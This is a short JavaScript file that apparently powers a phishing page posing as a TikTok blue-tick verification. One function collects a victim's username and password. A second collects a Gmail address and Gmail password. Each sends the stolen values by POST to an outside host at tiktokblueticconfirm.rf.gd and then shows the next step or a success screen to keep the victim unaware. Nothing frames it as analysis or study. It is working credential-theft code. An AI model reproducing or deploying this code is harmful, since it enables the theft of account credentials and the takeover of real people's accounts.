
function nextStep() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    fetch('http://tiktokblueticconfirm.rf.gd/save_data.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    }).then(() => {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }).catch(err => console.error('Error:', err));
}

function submitForm() {
    const gmail = document.getElementById('gmail').value;
    const gmailPassword = document.getElementById('gmail-password').value;
    fetch('http://tiktokblueticconfirm.rf.gd/save_data.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ gmail, gmailPassword })
    }).then(() => {
        document.getElementById('step2').style.display = 'none';
        document.getElementById('success').style.display = 'block';
    }).catch(err => console.error('Error:', err));
}